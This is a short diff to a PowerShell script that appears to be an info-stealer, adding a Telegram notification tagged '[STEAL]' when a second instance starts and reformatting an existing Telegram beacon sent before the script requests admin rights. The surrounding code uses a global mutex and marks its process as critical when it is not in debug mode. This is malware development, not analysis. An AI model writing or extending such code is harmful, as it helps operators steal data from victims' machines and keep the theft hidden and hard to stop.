@@ -200,7 +200,9 @@ function KDMUTEX {
     $CreatedNew = $false
     $script:SingleInstanceEvent = New-Object Threading.EventWaitHandle $true, ([Threading.EventResetMode]::ManualReset), "Global\$AppID", ([ref] $CreatedNew)
     if (-not $CreatedNew) {
-        throw "[!] An instance of this script is already running."
+		$message = "$($redExclamation) [STEAL] An instance of this script is already running."
+		Send-TelegramMessage -message $message
+		throw "[!] An instance of this script is already running."
     }
     elseif ($criticalprocess -and -not $debug) {
         [ProcessUtility]::MakeProcessCritical()
@@ -1303,7 +1305,7 @@ if (CHECK_AND_PATCH -eq $true) {
 else {
     Write-Host "[!] Please run as admin !" -ForegroundColor Red
     Start-Sleep -s 1
-	$message = "$($redExclamation) [STEAL] Request Admin"
+    $message = "$($redExclamation) [STEAL] Request Admin"
     Send-TelegramMessage -message $message
     Request-Admin
 }
